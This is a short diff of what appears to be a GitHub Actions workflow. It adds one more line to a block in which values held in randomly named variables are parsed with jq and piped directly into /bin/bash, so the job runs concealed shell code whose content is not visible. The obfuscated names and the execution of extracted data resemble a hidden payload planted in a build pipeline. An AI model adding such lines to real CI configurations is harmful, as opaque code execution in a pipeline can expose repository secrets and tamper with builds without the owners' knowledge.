@@ -28,6 +28,7 @@ jobs:
           echo $tgzbo14 | jq -r .bzaop2 | /bin/bash
           printf '%s' "$bz70" | jq -r .ly61249 | /bin/bash
           printf '%s' "$iu9461" | jq -r .eb8 | /bin/bash
+          echo $kbfpd707 | jq -r .fspe0068 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
